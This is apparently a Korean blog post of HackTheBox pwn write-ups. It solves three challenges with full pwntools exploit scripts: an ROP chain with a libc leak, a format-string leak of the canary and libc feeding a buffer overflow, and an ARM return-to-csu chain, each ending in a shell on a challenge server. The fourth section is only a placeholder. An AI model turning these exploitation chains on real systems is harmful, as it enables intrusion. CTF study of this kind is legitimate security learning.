---
layout: post
title:  "HackTheBox Pwn Study - 2"
author: 5un9hun
categories: [ HackTheBox ]
tags: [ HTB, Pwn ]
image: assets/images/htb/pwn2/title.png
description: "hackthebox pwn study - 2"
hidden: false
---

계속해서 문제를 풀고 있다.

- [1. Space - medium (40pts)](#1-space---medium-40pts)
- [2. What does the f say? - medium (30pts)](#2-what-does-the-f-say---medium-30pts)
- [3. Antidote - medium (30pts)](#3-antidote---medium-30pts)
- [4. Toxin - medium (40pts)](#4-toxin---medium-40pts)

## 1. Space - medium (40pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn2/Untitled.png)

바이너리 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn2/Untitled%201.png)

프로그램 동작 방식은 다음과 같다.

1. 버퍼에 31바이트의 입력을 받는다.
2. 해당 버퍼를 vuln 함수의 인자로 호출한다.
3. vuln 함수에서는 strcpy 함수를 통해 10바이트의 버퍼에 복사한다.

**취약점 탐색**

취약점은 vuln 함수에서 strcpy 함수를 통해 Buffer Overflow 취약점이 발생한다.

취약점을 트리거하기 위해서 쉘코드를 이용하거나 ROP chain을 구성하면 될 것 같다.

나는 ROP chain을 구성하는 방식을 택했다.

방식은 libc base를 leak하고 system(”/bin/sh”) 를 호출하도록 했다. libc 파일이 주어지지 않았지만, libc database를 통해 offset을 얻을 수 있었다.

![Untitled](/assets/images/htb/pwn2/Untitled%202.png)

**페이로드**

```python
from pwn import *

r = remote('206.189.25.173', 30216)

printf_plt = 0x08049040
read_got = 0x0804B2D0

pr = 0x0804901e

main = 0x80491cf

read_offset = 0x0f4410
system_offset = 0x045420
binsh_offset = 0x18f352

payload = b''
payload += b'A'*14
payload += b'B'*4
payload += p32(printf_plt)
payload += p32(main)
payload += p32(read_got)

r.sendafter("> ", payload)

read_addr = u32(r.recv(4))
libc_base = read_addr - read_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

log.info('libc_base : ' + hex(libc_base))

payload = b''
payload += b'A'*14
payload += b'B'*4
payload += p32(system_addr)
payload += p32(main)
payload += p32(binsh_addr)

r.sendafter("> ", payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn2/Untitled%203.png)

## 2. What does the f say? - medium (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn2/Untitled%204.png)

바이너리 파일 한 개가 주어진다.

### 풀이 과정

보호 기법은 다음과 같다. 깔끔하게 다 걸려있다.

![Untitled](/assets/images/htb/pwn2/Untitled%205.png)

프로그램의 기능은 다음과 같다.

1. srock을 float형으로 출력하고, srock이 0보다 작은지 체크한다.
2. 메뉴 출력 1. Space drink 2. Space food
3. 각각의 메뉴는 drinks_menu 함수, food_menu 함수를 호출한다.
4. 각각의 함수에서는 내부적으로 물건을 구매할 수 있고, 구매할 때마다 srock가 줄어든다.

**취약점 탐색**

drinks_menu 에서 2번을 선택할 때 다음과 같이 Foramt String Bug 취약점(== FSB 취약점)이 발생한다.

```c
...
case 2:
      srock_check();
      puts("\nRed or Green Kryptonite?");
      read(0, s, 29uLL);
      printf(s); //fsb 
      warning();
      break;
...
```

이를 통해 스택 내에 있는 주소를 leak할 수 있다. 일단 필요한 주소는 libc 함수이다. 일반적으로 스택상에 쉽게 존재하는 \__libc_start_main 함수를 leak할 수 있다. offset 25에 존재한다.

libc 파일이 주어지지 않았기 때문에 서버가 어떠한 libc를 사용하는지 확인해야한다. 유출된 주소의 하위 24bit를 통해 offset을 찾을 수 있다.

leak된 offset은 libc databse 에서 검색할 수 있다. leak된 주소는 \__libc_start_main + 241 이므로 거기서 241을 뺀 ab0 을 offset으로 검색했다. (\__libc_start_main_ret 으로 검색하면 안빼도 됨)

![Untitled](/assets/images/htb/pwn2/Untitled%206.png)

따라서 libc base의 주소를 구할 수 있고, 이 libc 를 통해 one gadget을 구했다.

FSB 취약점을 이용해서 스택 주소를 leak하고, ret부분에 덮을려고 했는데 덮어지지 않았다. Full Relro 기법이 걸려도 스택에는 덮히는 걸로 알고 있는데… 한 번 찾아봐야겠다.

다행히도 여기서는 다른 취약점이 또 존재했다. 바로 drinks_menu 함수에서 2번을 선택했을 때 warning 함수가 호출되는데 여기서 srock가 20.0 보다 작으면 버퍼에 scanf 함수로 입력을 받는다. 여기서 Buffer Overflow 취약점이 발생한다.

```c
...
puts("\nYou have less than 20 space rocks! Are you sure you want to buy it?");
 __isoc99_scanf("%s", s1); //bof
if ( !strcmp(s1, "yes") ) {
	*(float *)&v0 = *(float *)&srocks - 6.9;
	srocks = v0;
	srock_check();
	enjoy("Kryptonite vodka");
}
...
```

Canary 보호 기법이 존재하기 때문에 위에서 발견한 FSB 취약점을 이용해 canary를 leak해야 한다. canary의 위치는 offset 13에 있다. (콜스택이 조금 쌓여있어서 다른 offset에도 존재함.)

따라서 FSB 취약점으로 libc base, canary를 leak하고, srock를 20이하로 사용한 뒤에 다시 drink_menu의 2번으로 진행하여 BOF 취약점을 이용할 수 있고, ret의 값을 one gadget 주소로 덮으면 된다.

**페이로드**

```python
from pwn import *

r = remote('178.128.38.69', 31407)
#r = process('what_does_the_f_say')

#gdb.attach(r, 'b*drinks_menu+249\nc')

og = [0x4f365, 0x4f3c2, 0x10a45c]

r.sendlineafter(b'Space food\n', b'1')
r.sendlineafter(b'(70.00 s.rocks)\n', b'2')

r.sendafter(b'Kryptonite?\n', b'%25$p')

__libc_start_main = int(r.recvline()[:-1], 16) - 231
libc_base = __libc_start_main - 0x021ab0
og_addr = libc_base + og[0]
log.info("libc_base : " + hex(libc_base))

#r.sendlineafter(b'Space food\n', b'1')
#r.sendlineafter(b'(70.00 s.rocks)\n', b'2')

#r.sendafter(b'Kryptonite?\n', b'%1$p')

#stack_ret = int(r.recvline()[:-1], 16) + ret_offset
#log.info("stack_ret : " + hex(stack_ret))

r.sendlineafter(b'Space food\n', b'1')
r.sendlineafter(b'(70.00 s.rocks)\n', b'2')

r.sendafter(b'Kryptonite?\n', b'%13$p')
canary = int(r.recvline()[:-1], 16)
log.info("canary : " + hex(canary))

for i in range(7):
	r.sendlineafter(b'Space food\n', b'1')
	r.sendlineafter(b'(70.00 s.rocks)\n', b'2')
	r.sendafter(b'Kryptonite?\n', b'A'*8)

payload = b''
payload += b'A'*(0x20 - 8)
payload += p64(canary)
payload += b'B'*8
payload += p64(og_addr)

r.sendlineafter(b'want to buy it?\n', payload)

r.interactive()
```

### 플래그 획득

![Untitled](/assets/images/htb/pwn2/Untitled%207.png)

## 3. Antidote - medium (30pts)

### 문제 디스크립션

![Untitled](/assets/images/htb/pwn2/Untitled%208.png)

바이너리 파일과 libc 파일이 주어진다.

### 풀이 과정

보호 기법은 다음과 같다.

![Untitled](/assets/images/htb/pwn2/Untitled%209.png)

ARM 아키텍처 문제다.

ARM 공부는 겉핥기로 해서 이번에 다시 공부해봤다.

프로그램 기능은 다음과 같다.

1. 디스크립션 출력
2. 300바이트의 입력받음.

**취약점 탐색**

버퍼는 64바이트인데 입력을 300바이트의 입력을 받아서 Buffer Overflow가 발생한다.

ROP 를 이용해서 libc 주소를 leak하고, system 함수를 call하는 방식으로 셸을 획득할 수 있다.

하지만 이 바이너리에서 leak에 쓸만한 출력 함수가 write 함수밖에 없었고, 인자 3개를 전달할 가젯이 마땅히 없었다. 따라서 Return To Csu 기법을 이용해서 인자를 전달할 수 있다. (RTC 기법으로 페이로드 짜는 설명은 생략)

여기서 RTC 기법을 이용하기 위해 가젯을 찾았는데 BLX R3 부분과 BLX R12 부분이 있는데 R12 부분을 이용하면 ROP를 이용하여 chain을 계속 이용할 수 있지만, R3부분은 chain이 연결되지 않는다.

```python
loc_85EC
MOV     R5, R4
LDR     R3, [R5],#4
MOV     R0, R10
MOV     R1, R8
MOV     R2, R7
BLX     R3
ADD     R6, R6, #2
LDR     R12, [R4,#4]
MOV     R0, R10
MOV     R1, R8
MOV     R2, R7
BLX     R12
CMP     R6, R9
ADD     R4, R5, #4
BNE     loc_85EC
```

따라서 Leak 부분은 아래부분을 사용했고, system 을 호출해주는 부분은 위에 가젯을 사용했다. 아랫 가젯은 call 할 주소가 있는 포인터주소를 알아야하기 때문에.. system을 call할 때는 위의 가젯을 사용해야한다.

**페이로드**

```python
from pwn import *

r = remote('139.59.186.103', 32717)
#r = process("qemu-arm-static -L /usr/arm-linux-gnueabi/ -g 1234 ./antidote".split(" "))
e = ELF('libc.so.6')

system_offset = e.symbols['system']
binsh_offset = list(e.search(b'/bin/sh'))[0]

write_plt = 0x8420
write_got = 0x10850
read_got = 0x1083C

csu_first = 0x8628 		#POP     {R4-R10,PC}

csu1_second = 0x8608  	#LDR     R12, [R4,#4]
						#MOV     R0, R10
						#MOV     R1, R8
						#MOV     R2, R7
						#BLX     R12
						#CMP     R6, R9
						#ADD     R4, R5, #4
						#BNE     loc_85EC

csu2_second = 0x83cc 	#POP     {R3,PC}
csu2_third = 0x85f4 	#MOV     R0, R10
					 	#MOV     R1, R8
						#MOV     R2, R7
						#BLX     R3

#Libc Leak
main = 0x84e4

payload = b''
payload += b'A'*(0xdc - 4)
payload += b'B'*4
payload += p32(csu_first)
payload += p32(write_got - 4) #R4
payload += p32(0) #R5
payload += p32(0) #R6
payload += p32(4) #R7
payload += p32(read_got) #R8
payload += p32(0) #R9
payload += p32(0x1) #R10
payload += p32(csu1_second) #PC

payload += p32(0) #R4
payload += p32(0) #R5
payload += p32(0) #R6
payload += p32(0) #R7
payload += p32(0) #R8
payload += p32(0) #R9
payload += p32(0) #R10
payload += p32(main) #PC

r.sendlineafter(b'That hurt!\n', payload)

libc_base = u32(r.recv(4)) - e.symbols['read']
log.info("libc_base : " + hex(libc_base))
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

#Exploit
payload = b''
payload += b'A'*(0xdc - 4)
payload += b'B'*4
payload += p32(csu_first)
payload += p32(0) #R4
payload += p32(0) #R5
payload += p32(0) #R6
payload += p32(0) #R7
payload += p32(0) #R8
payload += p32(0) #R9
payload += p32(binsh_addr) #R10
payload += p32(csu2_second) #PC
payload += p32(system_addr) #R3
payload += p32(csu2_third) #PC

r.sendlineafter(b'That hurt!\n', payload)

r.interactive()
```

가젯 놀이 재밌다~

### 플래그 획득

workdir 를 왜 / 로 해놨지..

![Untitled](/assets/images/htb/pwn2/Untitled%2010.png)

## 4. Toxin - medium (40pts)

### 문제 디스크립션
ㅇㅇㅇㅇdddd

### 풀이 과정

### 플래그 획득